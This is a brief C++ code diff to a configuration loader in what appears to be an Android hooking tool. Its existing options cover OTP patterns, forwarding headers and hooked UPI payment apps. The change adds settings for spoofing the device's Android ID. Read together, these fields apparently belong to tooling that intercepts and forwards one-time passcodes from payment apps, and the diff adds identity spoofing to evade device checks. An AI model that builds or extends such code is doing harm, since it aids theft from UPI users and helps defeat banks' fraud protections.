@@ -183,6 +183,8 @@ bool ConfigManager::load() {
     config_.otp_patterns = parse_string_array(json, "otp_patterns");
     config_.forward_headers = parse_headers(json);
     config_.hooked_upi_apps = parse_bool_map(json, "hooked_upi_apps");
+    config_.enable_device_id_spoof = parse_bool(json, "enable_device_id_spoof", false);
+    config_.spoof_android_id = parse_string(json, "spoof_android_id", config_.spoof_android_id);
 
     if (config_.otp_patterns.empty()) {
         config_.otp_patterns = {
